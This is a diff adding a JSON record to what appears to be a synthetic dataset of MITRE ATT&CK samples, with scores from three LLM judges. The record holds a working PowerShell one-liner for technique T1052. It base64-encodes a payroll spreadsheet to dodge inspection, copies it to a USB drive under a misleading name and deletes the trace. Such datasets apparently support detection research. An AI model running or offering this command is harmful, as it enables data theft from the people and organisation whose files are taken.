@@ -1,0 +1,59 @@
+{
+  "technique_id": "T1052",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "$usb=((Get-CimInstance Win32_LogicalDisk -Filter \"DriveType=2\" | Select -First 1 -ExpandProperty DeviceID)+'\\'); $enc=Join-Path $env:TEMP 'payroll.b64'; $bytes=[IO.File]::ReadAllBytes(\"$env:USERPROFILE\\Desktop\\HR\\payroll.xlsx\"); [IO.File]::WriteAllText($enc,[Convert]::ToBase64String($bytes)); New-Item -ItemType Directory -Force -Path (Join-Path $usb 'Reports') | Out-Null; Copy-Item $enc (Join-Path $usb 'Reports\\q1_report.txt') -Force; Remove-Item $enc -Force",
+  "explanation": "Base64-encodes a sensitive spreadsheet and stores it as a text file on the removable drive under an innocuous folder, using Copy-Item. Uses only local operations.",
+  "rationale_steps": [
+    "Locate removable media via WMI",
+    "Base64-encode the target to evade simple content inspection",
+    "Create a benign-looking folder on the USB",
+    "Copy the encoded data with Copy-Item",
+    "Remove local encoded artifact"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1052-1ea95c55-f69d8eff",
+  "source_prompt_hash": "1ea95c55",
+  "timestamp_utc": "2025-09-30T05:10:56.829613Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed PowerShell with balanced quotes/parentheses, proper separators, and valid cmdlets/parameters and operators.",
+        "semantic_score": 5,
+        "semantic_justification": "It base64-encodes the target file, creates an innocuous folder on a removable (DriveType=2) drive, copies the encoded text there under a misleading name, and deletes the temp file\u2014consistent with exfiltration over physical media.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2025-10-01T06:49:42.340221Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, parentheses, and braces, proper command separators, valid PowerShell syntax, and appropriate variable assignments and method calls.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly implements the T1052 technique by identifying a removable drive, base64-encoding a sensitive file (payroll.xlsx), copying it to the USB drive with an innocuous name (q1_report.txt), and cleaning up traces - all core behaviors of exfiltration over physical medium.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T06:49:45.869606Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed, using correct PowerShell cmdlets, .NET method calls, variable assignments, and statement separators with balanced syntax.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly achieves its stated intent by base64-encoding a file, staging it, and then copying it to a newly created innocuous folder on a removable drive, fully aligning with the T1052 technique for exfiltration over physical medium.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2025-10-01T06:49:59.450168Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 5.0,
+    "llm_average_score": 5.0,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
